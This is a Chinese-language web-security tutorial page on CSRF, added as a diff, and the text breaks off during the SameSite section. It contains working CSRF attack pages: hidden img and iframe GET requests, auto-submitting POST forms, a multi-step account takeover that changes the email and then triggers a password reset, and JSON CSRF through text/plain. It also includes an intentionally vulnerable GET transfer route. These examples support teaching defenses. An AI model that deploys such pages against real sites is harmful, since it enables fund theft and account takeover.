@@ -1,0 +1,1627 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF 跨站请求伪造 - 经典漏洞专题</title>
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page-wrapper">
+  <nav class="sidebar">
+    <h2>经典漏洞专题</h2>
+    <ul>
+      <li><a href="01_XSS攻击.html">XSS 跨站脚本</a></li>
+      <li><a href="02_CSRF攻击.html" class="active">CSRF 跨站请求伪造</a></li>
+      <li><a href="03_XXE注入.html">XXE 外部实体注入</a></li>
+      <li><a href="04_文件上传漏洞.html">文件上传与包含</a></li>
+    </ul>
+    <h2>本页目录</h2>
+    <ul>
+      <li><a href="#principle">CSRF原理</a></li>
+      <li><a href="#vs-xss">与XSS的区别</a></li>
+      <li><a href="#attack-examples">攻击实例</a></li>
+      <li><a href="#token-defense">Token防御</a></li>
+      <li><a href="#samesite">SameSite防御</a></li>
+      <li><a href="#referer-origin">Referer/Origin检查</a></li>
+      <li><a href="#bypass">防御绕过</a></li>
+      <li><a href="#defense-code">完整防御代码</a></li>
+    </ul>
+    <h2>导航</h2>
+    <ul>
+      <li><a href="../index.html">返回首页</a></li>
+      <li><a href="01_XSS攻击.html">XSS 攻击</a></li>
+    </ul>
+  </nav>
+
+  <main class="main-content">
+    <div class="breadcrumb">
+      <a href="../index.html">首页</a> / <a href="01_XSS攻击.html">经典漏洞专题</a> / CSRF 跨站请求伪造
+    </div>
+
+    <h1>CSRF 跨站请求伪造完全指南</h1>
+    <p><span class="tag critical">HIGH</span> CSRF (Cross-Site Request Forgery) 又称 "One-Click Attack" 或 "Session Riding"，攻击者诱导已认证用户的浏览器向目标网站发送非预期的请求，从而在用户不知情的情况下以用户身份执行操作。</p>
+
+    <div class="info-box note">
+      <div class="box-title">CSRF 的本质</div>
+      <p>CSRF 的本质是：<strong>浏览器在发送跨站请求时会自动附带目标站点的 Cookie</strong>。攻击者无法读取响应（受同源策略保护），但请求本身已经以受害者身份发出并被服务器执行。这是一种 "write-only" 攻击 —— 攻击者只需要请求被执行，不需要获取响应。</p>
+    </div>
+
+    <!-- Section 1: CSRF 原理 -->
+    <h2 id="principle">1. CSRF 攻击原理</h2>
+
+    <h3>1.1 攻击前提条件</h3>
+    <p>CSRF 攻击成功需要同时满足以下所有条件：</p>
+    <table>
+      <thead><tr><th>条件</th><th>说明</th><th>重要性</th></tr></thead>
+      <tbody>
+        <tr><td><strong>用户已认证</strong></td><td>用户已登录目标网站，浏览器持有有效 Session Cookie</td><td>必需</td></tr>
+        <tr><td><strong>可预测的请求</strong></td><td>目标操作的请求参数完全可预测（无随机 Token 等不可预测值）</td><td>必需</td></tr>
+        <tr><td><strong>基于 Cookie 认证</strong></td><td>服务器仅依赖 Cookie 来验证用户身份，无其他校验</td><td>必需</td></tr>
+        <tr><td><strong>诱导用户访问</strong></td><td>攻击者能让受害者访问恶意页面（钓鱼邮件、论坛帖子、广告等）</td><td>必需</td></tr>
+      </tbody>
+    </table>
+
+    <h3>1.2 攻击流程图</h3>
+    <div class="diagram">
+<pre>
+┌─────────────┐                  ┌─────────────┐                  ┌─────────────┐
+│   受害者     │                  │  恶意网站    │                  │  目标网站    │
+│  (浏览器)    │                  │ evil.com    │                  │ bank.com    │
+└──────┬──────┘                  └──────┬──────┘                  └──────┬──────┘
+       │                                │                                │
+       │  ① 用户正常登录 bank.com        │                                │
+       │────────────────────────────────────────────────────────────────▶│
+       │                                │                                │
+       │  ② 服务器返回 Session Cookie    │                                │
+       │  Set-Cookie: session=abc123    │                                │
+       │◀────────────────────────────────────────────────────────────────│
+       │                                │                                │
+       │  ③ 用户被诱导访问 evil.com       │                                │
+       │  （钓鱼邮件/论坛链接/广告）       │                                │
+       │────────────────────────────────▶│                                │
+       │                                │                                │
+       │  ④ evil.com 返回恶意页面         │                                │
+       │  （含隐藏表单/img标签）           │                                │
+       │◀────────────────────────────────│                                │
+       │                                │                                │
+       │  ⑤ 恶意页面自动向 bank.com 发起请求                               │
+       │  浏览器自动附带 Cookie: session=abc123                            │
+       │────────────────────────────────────────────────────────────────▶│
+       │                                │                                │
+       │                                │    ⑥ 服务器验证Cookie有效        │
+       │                                │       执行转账/修改密码等操作     │
+       │                                │                                │
+       │  ⑦ 操作完成，用户毫不知情        │                                │
+       │◀────────────────────────────────────────────────────────────────│
+       ▼                                ▼                                ▼
+</pre>
+    </div>
+
+    <div class="info-box warning">
+      <div class="box-title">关键理解：为什么同源策略没有阻止 CSRF？</div>
+      <p>很多人误以为"同源策略能防止 CSRF"。实际上：</p>
+      <ul>
+        <li>同源策略阻止的是<strong>跨域读取响应</strong>（evil.com 的 JS 不能读取 bank.com 的响应）</li>
+        <li>同源策略<strong>不阻止跨域发送请求</strong>（&lt;form&gt;、&lt;img&gt;、&lt;iframe&gt; 都可以跨域发请求）</li>
+        <li>CSRF 攻击者不需要读取响应 —— 只需要请求<strong>被发送并执行</strong>即可</li>
+      </ul>
+    </div>
+
+    <h3>1.3 浏览器 Cookie 自动附带机制</h3>
+    <div class="diagram">
+<pre>
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                      浏览器 Cookie 自动附带规则                               │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│  用户在 evil.com 页面上 → 页面包含 &lt;img src="https://bank.com/pay?..."&gt;    │
+│                                                                             │
+│  浏览器行为：                                                                │
+│  ┌─────────────────────────────────────────────────────────┐               │
+│  │  HTTP Request to bank.com:                              │               │
+│  │                                                         │               │
+│  │  GET /pay?to=attacker&amount=10000 HTTP/1.1             │               │
+│  │  Host: bank.com                                         │               │
+│  │  Cookie: session=abc123  ← 浏览器自动附带！              │               │
+│  │  Referer: https://evil.com/page.html                    │               │
+│  │                                                         │               │
+│  │  ※ 无论请求从哪个页面发出，只要目标是 bank.com，          │               │
+│  │    浏览器就会附带 bank.com 的 Cookie                     │               │
+│  └─────────────────────────────────────────────────────────┘               │
+│                                                                             │
+│  同源策略的限制：                                                            │
+│  ┌───────────────────────────────┐  ┌───────────────────────────────┐      │
+│  │  ❌ evil.com 的 JS 无法：      │  │  ✅ evil.com 的页面可以：      │      │
+│  │  • 读取 bank.com 的 Cookie    │  │  • 发送请求到 bank.com        │      │
+│  │  • 读取 bank.com 的响应内容   │  │  • 触发表单提交到 bank.com    │      │
+│  │  • 操作 bank.com 的 DOM      │  │  • 加载 bank.com 的图片/脚本  │      │
+│  └───────────────────────────────┘  └───────────────────────────────┘      │
+│                                                                             │
+│  → CSRF 只需要"发送"，不需要"读取" → 同源策略无法防御 CSRF                    │
+└─────────────────────────────────────────────────────────────────────────────┘
+</pre>
+    </div>
+
+    <!-- Section 2: 与XSS的区别 -->
+    <h2 id="vs-xss">2. CSRF 与 XSS 的区别</h2>
+
+    <h3>2.1 信任方向对比</h3>
+    <table>
+      <thead><tr><th>维度</th><th>XSS (跨站脚本)</th><th>CSRF (跨站请求伪造)</th></tr></thead>
+      <tbody>
+        <tr><td><strong>信任方向</strong></td><td>利用网站对用户输入的信任<br>（网站信任用户提供的数据）</td><td>利用浏览器对网站的信任<br>（浏览器信任网站 → 自动发Cookie）</td></tr>
+        <tr><td><strong>攻击目标</strong></td><td>在受害者浏览器中执行任意 JavaScript</td><td>以受害者身份发送特定请求</td></tr>
+        <tr><td><strong>能否读取数据</strong></td><td>✅ 可读取页面内容、Cookie、LocalStorage</td><td>❌ 无法读取响应（同源策略阻止）</td></tr>
+        <tr><td><strong>注入位置</strong></td><td>恶意代码注入到<strong>目标网站页面</strong></td><td>恶意请求从<strong>第三方网站</strong>发出</td></tr>
+        <tr><td><strong>能力范围</strong></td><td>几乎可以做目标源内的<strong>任何事</strong></td><td>只能触发<strong>可预测的状态修改</strong>操作</td></tr>
+        <tr><td><strong>用户交互</strong></td><td>需要访问含 XSS 的页面</td><td>需要在已登录状态下访问恶意页面</td></tr>
+        <tr><td><strong>防御核心</strong></td><td>输出编码、CSP、输入验证</td><td>CSRF Token、SameSite Cookie</td></tr>
+        <tr><td><strong>是否需要漏洞</strong></td><td>需要目标网站有 XSS 漏洞</td><td>只需要目标网站<strong>缺少 CSRF 防护</strong></td></tr>
+      </tbody>
+    </table>
+
+    <h3>2.2 攻击模型可视化对比</h3>
+    <div class="diagram">
+<pre>
+  ╔═══════════════════════════════════╗    ╔═══════════════════════════════════╗
+  ║         XSS 攻击模型              ║    ║        CSRF 攻击模型              ║
+  ╠═══════════════════════════════════╣    ╠═══════════════════════════════════╣
+  ║                                   ║    ║                                   ║
+  ║  攻击者将恶意代码注入目标网站       ║    ║  攻击者从自己的网站发起请求        ║
+  ║                                   ║    ║                                   ║
+  ║  ┌──────────┐    注入JS代码        ║    ║  ┌──────────┐                    ║
+  ║  │  攻击者   │──────────┐          ║    ║  │  攻击者   │                    ║
+  ║  └──────────┘          │          ║    ║  └─────┬────┘                    ║
+  ║                        ▼          ║    ║        │ 部署恶意页面              ║
+  ║               ┌──────────────┐    ║    ║        ▼                          ║
+  ║               │  目标网站      │    ║    ║  ┌──────────────┐               ║
+  ║               │  (bank.com)  │    ║    ║  │  evil.com     │               ║
+  ║               │  含恶意JS     │    ║    ║  │  (恶意页面)   │               ║
+  ║               └───────┬──────┘    ║    ║  └───────┬──────┘               ║
+  ║                       │           ║    ║          │                        ║
+  ║           执行恶意JS   │           ║    ║   诱导访问│                        ║
+  ║           (同源权限)   ▼           ║    ║          ▼                        ║
+  ║               ┌──────────────┐    ║    ║  ┌──────────────┐               ║
+  ║               │  受害者浏览器  │    ║    ║  │  受害者浏览器  │               ║
+  ║               │  ← 窃取数据   │    ║    ║  │  (已登录bank) │               ║
+  ║               │  ← 修改页面   │    ║    ║  └───────┬──────┘               ║
+  ║               │  ← 发送请求   │    ║    ║          │ 自动带Cookie           ║
+  ║               └──────────────┘    ║    ║          ▼                        ║
+  ║                                   ║    ║  ┌──────────────┐               ║
+  ║  关键词: 注入、执行、控制          ║    ║  │  bank.com    │               ║
+  ║                                   ║    ║  │  执行操作！   │               ║
+  ║                                   ║    ║  └──────────────┘               ║
+  ║                                   ║    ║                                   ║
+  ║                                   ║    ║  关键词: 伪造、身份、请求          ║
+  ╚═══════════════════════════════════╝    ╚═══════════════════════════════════╝
+</pre>
+    </div>
+
+    <h3>2.3 XSS 与 CSRF 的关联</h3>
+    <div class="info-box note">
+      <div class="box-title">XSS 是 CSRF 防御的天敌</div>
+      <p>如果目标网站存在 XSS 漏洞，攻击者可以：</p>
+      <ul>
+        <li>通过 XSS 读取页面中嵌入的 CSRF Token</li>
+        <li>构造包含正确 Token 的请求，绕过所有 CSRF 防御</li>
+        <li>甚至不需要 CSRF —— XSS 本身就能直接发送同源请求</li>
+      </ul>
+      <p><strong>结论</strong>：修复所有 XSS 漏洞是 CSRF 防御的前提条件。XSS 是 CSRF 的超集。</p>
+    </div>
+
+    <!-- Section 3: 攻击示例 -->
+    <h2 id="attack-examples">3. CSRF 攻击实例</h2>
+
+    <h3>3.1 GET 型 CSRF（img 标签触发）</h3>
+    <p>最简单的 CSRF 形式。当目标网站用 GET 请求执行敏感操作时（违反 HTTP 规范），攻击极为容易：</p>
+
+    <p><strong>存在漏洞的服务端代码：</strong></p>
+    <pre><code># 错误示范：使用 GET 执行转账操作（违反 RESTful 设计原则）
+@app.route('/transfer', methods=['GET'])
+def transfer():
+    to_account = request.args.get('to')
+    amount = request.args.get('amount')
+    # 仅通过 Cookie 中的 session 验证用户身份
+    user = get_user_from_session(request.cookies.get('session'))
+    if user:
+        execute_transfer(user, to_account, amount)
+        return "转账成功"</code></pre>
+
+    <p><strong>攻击者的恶意页面（多种触发方式）：</strong></p>
+    <pre><code>&lt;!-- evil.com/attack.html --&gt;
+&lt;h1&gt;恭喜你中奖了！点击查看详情&lt;/h1&gt;
+
+&lt;!-- 方法1：img 标签（最隐蔽，0像素不可见，用户完全无感知） --&gt;
+&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=100000"
+     width="0" height="0" style="display:none"&gt;
+
+&lt;!-- 方法2：CSS background-image --&gt;
+&lt;div style="background:url('https://bank.com/transfer?to=attacker&amp;amount=50000')"&gt;
+&lt;/div&gt;
+
+&lt;!-- 方法3：script 标签 --&gt;
+&lt;script src="https://bank.com/transfer?to=attacker&amp;amount=50000"&gt;&lt;/script&gt;
+
+&lt;!-- 方法4：link 标签 --&gt;
+&lt;link rel="stylesheet" href="https://bank.com/transfer?to=attacker&amp;amount=50000"&gt;
+
+&lt;!-- 方法5：隐藏 iframe --&gt;
+&lt;iframe src="https://bank.com/transfer?to=attacker&amp;amount=50000"
+        width="0" height="0" frameborder="0"&gt;&lt;/iframe&gt;
+
+&lt;!-- 方法6：多个操作同时执行 --&gt;
+&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=50000"&gt;
+&lt;img src="https://bank.com/user/email?new=attacker@evil.com"&gt;
+&lt;img src="https://bank.com/user/password?new=hacked123"&gt;</code></pre>
+
+    <div class="info-box warning">
+      <div class="box-title">GET CSRF 的特殊危险性</div>
+      <ul>
+        <li><strong>HTML 邮件</strong>：可以嵌入 &lt;img&gt; 标签，邮件客户端加载图片时就触发攻击</li>
+        <li><strong>论坛/评论区</strong>：允许 &lt;img&gt; 的 BBCode 或 Markdown 中嵌入恶意 URL</li>
+        <li><strong>无需 JavaScript</strong>：纯 HTML 即可完成，绕过 NoScript 等插件</li>
+        <li><strong>极难检测</strong>：服务器日志中看到的是正常的 GET 请求</li>
+      </ul>
+      <p><strong>设计原则</strong>：永远不要用 GET 请求执行状态修改操作！GET 应该是安全的、幂等的。</p>
+    </div>
+
+    <h3>3.2 POST 型 CSRF（隐藏表单自动提交）</h3>
+    <p>大多数敏感操作使用 POST 方法，但这并不能阻止 CSRF 攻击。攻击者使用隐藏表单 + JavaScript 自动提交：</p>
+
+    <p><strong>目标请求：</strong></p>
+    <pre><code>POST /transfer HTTP/1.1
+Host: bank.com
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=abc123
+
+to=alice&amp;amount=10000</code></pre>
+
+    <p><strong>基本攻击页面：</strong></p>
+    <pre><code>&lt;!-- evil.com/csrf-post.html --&gt;
+&lt;html&gt;
+&lt;body onload="document.getElementById('csrf-form').submit();"&gt;
+  &lt;h1&gt;页面加载中，请稍候...&lt;/h1&gt;
+
+  &lt;!-- 隐藏的自动提交表单 --&gt;
+  &lt;form id="csrf-form"
+        action="https://bank.com/transfer"
+        method="POST"
+        style="display:none"&gt;
+    &lt;input type="hidden" name="to" value="attacker-account"&gt;
+    &lt;input type="hidden" name="amount" value="100000"&gt;
+    &lt;input type="hidden" name="memo" value="正常转账"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+    <p><strong>进阶版 —— 在 iframe 中静默提交（用户完全无感知）：</strong></p>
+    <pre><code>&lt;!-- evil.com/stealth-csrf.html --&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;h1&gt;精彩内容，请欣赏...&lt;/h1&gt;
+
+  &lt;!-- 表单提交到隐藏 iframe，不会造成页面跳转 --&gt;
+  &lt;iframe name="csrf-frame" style="display:none"&gt;&lt;/iframe&gt;
+
+  &lt;form id="csrf-form"
+        action="https://bank.com/transfer"
+        method="POST"
+        target="csrf-frame"&gt;
+    &lt;input type="hidden" name="to" value="attacker-account"&gt;
+    &lt;input type="hidden" name="amount" value="100000"&gt;
+  &lt;/form&gt;
+
+  &lt;script&gt;
+    // 自动提交
+    document.getElementById('csrf-form').submit();
+
+    // 可选：延迟后跳转正常页面，掩盖攻击痕迹
+    setTimeout(function() {
+      window.location = 'https://www.google.com';
+    }, 3000);
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+    <p><strong>多步骤 CSRF（模拟复杂操作流程）：</strong></p>
+    <pre><code>&lt;script&gt;
+// 多步骤攻击：先修改邮箱，再触发密码重置
+async function multiStepCSRF() {
+  // Step 1: 修改账户绑定邮箱
+  const frame1 = document.createElement('iframe');
+  frame1.name = 'step1';
+  frame1.style.display = 'none';
+  document.body.appendChild(frame1);
+
+  const form1 = document.createElement('form');
+  form1.action = 'https://target.com/settings/email';
+  form1.method = 'POST';
+  form1.target = 'step1';
+  form1.innerHTML = '&lt;input name="new_email" value="attacker@evil.com"&gt;';
+  document.body.appendChild(form1);
+  form1.submit();
+
+  // 等待第一步完成
+  await new Promise(resolve =&gt; setTimeout(resolve, 3000));
+
+  // Step 2: 触发密码重置（重置链接会发到已修改的邮箱）
+  const frame2 = document.createElement('iframe');
+  frame2.name = 'step2';
+  frame2.style.display = 'none';
+  document.body.appendChild(frame2);
+
+  const form2 = document.createElement('form');
+  form2.action = 'https://target.com/account/reset-password';
+  form2.method = 'POST';
+  form2.target = 'step2';
+  form2.innerHTML = '&lt;input name="action" value="send_reset_link"&gt;';
+  document.body.appendChild(form2);
+  form2.submit();
+}
+
+multiStepCSRF();
+&lt;/script&gt;</code></pre>
+
+    <h3>3.3 JSON CSRF</h3>
+    <p>现代 RESTful API 通常使用 JSON 格式。JSON CSRF 的难度更大，但在特定条件下仍可实现：</p>
+
+    <p><strong>目标 API 请求：</strong></p>
+    <pre><code>POST /api/transfer HTTP/1.1
+Host: bank.com
+Content-Type: application/json
+Cookie: session=abc123
+
+{"to": "alice", "amount": 10000}</code></pre>
+
+    <p><strong>攻击方式1：利用 form enctype=text/plain（最常用）</strong></p>
+    <pre><code>&lt;!--
+  HTML 表单 enctype="text/plain" 发送的请求体格式为: name=value
+  利用这个特性构造合法的 JSON
+--&gt;
+&lt;form action="https://bank.com/api/transfer"
+      method="POST"
+      enctype="text/plain"&gt;
+  &lt;input type="hidden"
+         name='{"to":"attacker","amount":100000,"padding":"'
+         value='whatever"}'&gt;
+&lt;/form&gt;
+
+&lt;!--
+  发送的请求体为:
+  {"to":"attacker","amount":100000,"padding":"=whatever"}
+
+  注意: 浏览器自动在 name 和 value 之间插入 = 号
+  如果服务端 JSON 解析器忽略未知字段，攻击成功
+
+  Content-Type 将会是 text/plain（非 application/json）
+  → 如果服务端不严格检查 Content-Type，则攻击有效
+--&gt;
+
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
+
+    <p><strong>攻击方式2：利用 fetch API（需要宽松 CORS 或不检查 Content-Type）</strong></p>
+    <pre><code>&lt;script&gt;
+// 方式 A: 使用 text/plain 避免 CORS Preflight
+// Content-Type 为 text/plain 是"简单请求"，不触发预检
+fetch('https://bank.com/api/transfer', {
+  method: 'POST',
+  credentials: 'include',  // 携带 Cookie
+  headers: {
+    'Content-Type': 'text/plain'  // 不会触发 CORS Preflight
+  },
+  body: JSON.stringify({to: 'attacker', amount: 100000})
+});
+
+// 方式 B: 如果目标有宽松的 CORS 配置（如 Access-Control-Allow-Origin: *）
+fetch('https://bank.com/api/transfer', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {
+    'Content-Type': 'application/json'  // 触发 Preflight，需要 CORS 允许
+  },
+  body: JSON.stringify({to: 'attacker', amount: 100000})
+});
+&lt;/script&gt;</code></pre>
+
+    <div class="info-box note">
+      <div class="box-title">JSON CSRF 的条件和限制</div>
+      <table>
+        <thead><tr><th>场景</th><th>是否可攻击</th><th>原因</th></tr></thead>
+        <tbody>
+          <tr><td>服务端不检查 Content-Type</td><td>✅ 可攻击</td><td>text/plain 的 JSON body 也被接受</td></tr>
+          <tr><td>服务端接受 text/plain</td><td>✅ 可攻击</td><td>简单请求不触发 Preflight</td></tr>
+          <tr><td>CORS: Allow-Origin: *</td><td>⚠️ 部分</td><td>* 不允许 credentials，但某些配置错误可利用</td></tr>
+          <tr><td>CORS 动态反射 Origin</td><td>✅ 可攻击</td><td>任何 Origin 都被允许</td></tr>
+          <tr><td>严格 Content-Type + 无 CORS</td><td>❌ 不可攻击</td><td>Preflight 被拒绝</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>3.4 其他 CSRF 变种</h3>
+    <table>
+      <thead><tr><th>变种类型</th><th>攻击方式</th><th>典型场景</th><th>危害</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Login CSRF</strong></td><td>让受害者登录攻击者的账户</td><td>受害者在攻击者账户中操作</td><td>信用卡信息泄露、隐私暴露</td></tr>
+        <tr><td><strong>Logout CSRF</strong></td><td>强制用户退出登录</td><td>配合钓鱼攻击</td><td>骚扰用户、引导到假登录页</td></tr>
+        <tr><td><strong>文件上传 CSRF</strong></td><td>利用 multipart/form-data 表单</td><td>头像修改、文档上传</td><td>上传恶意文件</td></tr>
+        <tr><td><strong>WebSocket CSRF</strong></td><td>WebSocket 握手时携带 Cookie</td><td>实时应用</td><td>建立冒充连接</td></tr>
+        <tr><td><strong>OAuth CSRF</strong></td><td>在 OAuth 流程中注入攻击者的 code</td><td>第三方登录</td><td>账号关联劫持</td></tr>
+      </tbody>
+    </table>
+
+    <!-- Section 4: Token 防御 -->
+    <h2 id="token-defense">4. CSRF Token 防御机制</h2>
+
+    <h3>4.1 Synchronizer Token Pattern（同步令牌模式）</h3>
+    <p>最经典、最可靠的 CSRF 防御方案。核心思想是在请求中包含一个攻击者无法预测的随机值：</p>
+
+    <div class="diagram">
+<pre>
+┌──────────────────────────────────────────────────────────────────────────────┐
+│                    Synchronizer Token Pattern 完整流程                         │
+├──────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  ┌──────────┐                                     ┌──────────────┐          │
+│  │  浏览器   │                                     │    服务器     │          │
+│  └─────┬────┘                                     └──────┬───────┘          │
+│        │                                                 │                  │
+│        │  ① GET /transfer-page                           │                  │
+│        │────────────────────────────────────────────────▶│                  │
+│        │                                                 │                  │
+│        │                                    ② 生成随机 Token: "a8f3c9..."   │
+│        │                                       存入 Session:               │
+│        │                                       session['csrf'] = "a8f3c9.."│
+│        │                                                 │                  │
+│        │  ③ 返回 HTML 页面                                │                  │
+│        │     &lt;form&gt;                                      │                  │
+│        │       &lt;input type="hidden"                      │                  │
+│        │              name="csrf_token"                   │                  │
+│        │              value="a8f3c9..."&gt;                  │                  │
+│        │     &lt;/form&gt;                                     │                  │
+│        │◀────────────────────────────────────────────────│                  │
+│        │                                                 │                  │
+│        │  ④ 用户填写表单并提交                             │                  │
+│        │     POST /transfer                              │                  │
+│        │     Cookie: session=xxx                         │                  │
+│        │     Body: to=alice&amount=100&csrf_token=a8f3c9 │                  │
+│        │────────────────────────────────────────────────▶│                  │
+│        │                                                 │                  │
+│        │                                    ⑤ 验证:                         │
+│        │                                    请求中 Token == Session 中 Token?│
+│        │                                    "a8f3c9..." == "a8f3c9..."      │
+│        │                                    ✅ 匹配 → 执行转账操作            │
+│        │                                    ❌ 不匹配 → 返回 403 Forbidden   │
+│        │                                                 │                  │
+│        │  ⑥ 转账成功                                      │                  │
+│        │◀────────────────────────────────────────────────│                  │
+│        ▼                                                 ▼                  │
+│                                                                              │
+│  ═══════════════════════════════════════════════════════════════════════════  │
+│  为什么攻击者无法伪造？                                                       │
+│  • Token 嵌入在 bank.com 的 HTML 页面中                                      │
+│  • evil.com 的 JS 无法跨域读取 bank.com 的页面内容（同源策略）                 │
+│  • 因此攻击者不知道 Token 值，无法构造含有效 Token 的请求                       │
+└──────────────────────────────────────────────────────────────────────────────┘
+</pre>
+    </div>
+
+    <h3>4.2 Token 实现要点</h3>
+    <table>
+      <thead><tr><th>要点</th><th>正确做法</th><th>错误做法</th><th>后果</th></tr></thead>
+      <tbody>
+        <tr><td><strong>随机性</strong></td><td>使用 CSPRNG<br><code>os.urandom(32)</code><br><code>crypto.randomBytes(32)</code></td><td>使用时间戳、用户ID、MD5(password)</td><td>Token 可被预测</td></tr>
+        <tr><td><strong>长度</strong></td><td>至少 128 bits (32 hex chars)</td><td>8位数字 Token</td><td>可被暴力破解</td></tr>
+        <tr><td><strong>绑定 Session</strong></td><td>每个用户 Session 有独立的 Token</td><td>全站共用 Token 池</td><td>攻击者可用自己的 Token</td></tr>
+        <tr><td><strong>传递方式</strong></td><td>隐藏表单字段或自定义 Header</td><td>放在 URL query string 中</td><td>Token 通过 Referer 泄露</td></tr>
+        <tr><td><strong>验证方式</strong></td><td>时间恒定比较<br><code>hmac.compare_digest()</code></td><td>普通 <code>==</code> 字符串比较</td><td>时序攻击可逐位猜测</td></tr>
+        <tr><td><strong>生命周期</strong></td><td>每次会话更新 / Per-request Token</td><td>Token 永不过期</td><td>窃取后可长期使用</td></tr>
+        <tr><td><strong>缺失处理</strong></td><td>Token 缺失时直接拒绝</td><td>Token 缺失时跳过验证</td><td>删除参数即可绕过</td></tr>
+      </tbody>
+    </table>
+
+    <h3>4.3 Double Submit Cookie Pattern（双重提交 Cookie）</h3>
+    <p>适用于<strong>无状态应用</strong>（无服务端 Session 存储）的替代方案：</p>
+
+    <div class="diagram">
+<pre>
+┌────────────────────────────────────────────────────────────────────────────┐
+│                 Double Submit Cookie Pattern 原理                           │
+├────────────────────────────────────────────────────────────────────────────┤
+│                                                                            │
+│  核心思想: 同一个随机值，通过两个不同渠道传递，服务端对比两者是否一致          │
+│                                                                            │
+│  渠道1: Cookie（浏览器自动发送）                                             │
+│  渠道2: 请求体/自定义Header（需要 JS 手动读取 Cookie 并设置）                 │
+│                                                                            │
+│  ┌──────────┐                              ┌──────────────┐               │
+│  │  服务器   │                              │   浏览器     │               │
+│  └─────┬────┘                              └──────┬───────┘               │
+│        │                                          │                       │
+│        │  Set-Cookie: csrf=xyz789                  │                       │
+│        │─────────────────────────────────────────▶│                       │
+│        │                                          │                       │
+│        │                            前端 JS 读取 Cookie: csrf=xyz789       │
+│        │                            设置到自定义 Header 中                  │
+│        │                                          │                       │
+│        │  POST /transfer                          │                       │
+│        │  Cookie: csrf=xyz789  ← (自动)           │                       │
+│        │  X-CSRF-Token: xyz789 ← (手动)           │                       │
+│        │◀─────────────────────────────────────────│                       │
+│        │                                          │                       │
+│        │  验证: Cookie值 == Header值?              │                       │
+│        │  xyz789 == xyz789 ✅                      │                       │
+│        │                                          │                       │
+│  ═══════════════════════════════════════════════════════════════════        │
+│  安全性依据:                                                               │
+│  • 攻击者可以让浏览器"发送"Cookie（浏览器自动行为）                          │
+│  • 但攻击者无法从 evil.com "读取" bank.com 的 Cookie 值                    │
+│  • 因此无法在请求体/Header 中设置正确的 Token 值                            │
+│                                                                            │
+│  ⚠️ 弱点: 子域名可以为父域设置 Cookie → 可覆盖 csrf Cookie                  │
+│  ✅ 改进: 使用 __Host- 前缀 + 签名 Token                                   │
+└────────────────────────────────────────────────────────────────────────────┘
+</pre>
+    </div>
+
+    <pre><code>// Double Submit Cookie - 前端实现
+function getCookie(name) {
+  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+  return match ? match[2] : null;
+}
+
+// 所有 AJAX 请求都附带 CSRF Token
+fetch('/api/transfer', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'X-CSRF-Token': getCookie('csrf_token')  // 从 Cookie 读取，放入 Header
+  },
+  credentials: 'include',
+  body: JSON.stringify({ to: 'alice', amount: 100 })
+});
+
+// Axios 全局配置
+axios.defaults.headers.common['X-CSRF-Token'] = getCookie('csrf_token');
+
+// 或使用拦截器
+axios.interceptors.request.use(config => {
+  if (!['get', 'head', 'options'].includes(config.method)) {
+    config.headers['X-CSRF-Token'] = getCookie('csrf_token');
+  }
+  return config;
+});</code></pre>
+
+    <h3>4.4 Signed Double Submit Cookie（签名双重提交）</h3>
+    <p>为解决普通 Double Submit 的子域名覆盖问题，对 Token 进行 HMAC 签名：</p>
+    <pre><code>import hmac
+import hashlib
+import secrets
+
+SERVER_SECRET = 'your-secret-key-never-expose'
+
+def generate_signed_token(session_id):
+    """
+    生成签名 Token:
+    token = nonce + "." + HMAC(server_secret, nonce + session_id)
+    即使攻击者覆盖 Cookie 中的值，也无法伪造有效签名
+    """
+    nonce = secrets.token_hex(16)
+    message = f"{nonce}{session_id}".encode()
+    signature = hmac.new(SERVER_SECRET.encode(), message, hashlib.sha256).hexdigest()
+    return f"{nonce}.{signature}"
+
+def validate_signed_token(token, session_id):
+    """验证签名 Token"""
+    try:
+        nonce, signature = token.split('.')
+        message = f"{nonce}{session_id}".encode()
+        expected = hmac.new(SERVER_SECRET.encode(), message, hashlib.sha256).hexdigest()
+        return hmac.compare_digest(signature, expected)
+    except (ValueError, AttributeError):
+        return False</code></pre>
+
+    <div class="info-box warning">
+      <div class="box-title">Double Submit Cookie 的弱点与改进</div>
+      <table>
+        <thead><tr><th>弱点</th><th>攻击方式</th><th>改进措施</th></tr></thead>
+        <tbody>
+          <tr><td>子域名注入 Cookie</td><td>sub.bank.com 为 .bank.com 设置 csrf Cookie</td><td>使用 <code>__Host-</code> 前缀（不允许 Domain 属性）</td></tr>
+          <tr><td>Cookie 值可预测</td><td>如果 Token 不随机</td><td>使用 CSPRNG 生成</td></tr>
+          <tr><td>无签名验证</td><td>攻击者设置已知值到 Cookie 和请求体</td><td>HMAC 签名绑定 Session</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- Section 5: SameSite Cookie -->
+    <h2 id="samesite">5. SameSite Cookie 属性防御</h2>
+
+    <h3>5.1 SameSite 属性详解</h3>
+    <p><code>SameSite</code> 是 Cookie 的安全属性，告诉浏览器在跨站请求时是否应该发送该 Cookie：</p>
+
+    <table>
+      <thead><tr><th>SameSite 值</th><th>行为描述</th><th>CSRF 防护效果</th><th>用户体验影响</th></tr></thead>
+      <tbody>
+        <tr><td><code><strong>Strict</strong></code></td><td>任何跨站请求都<strong>不</strong>发送 Cookie<br>（包括点击链接跳转）</td><td>✅ 完全防御所有 CSRF</td><td>⚠️ 从外部链接进入需重新登录</td></tr>
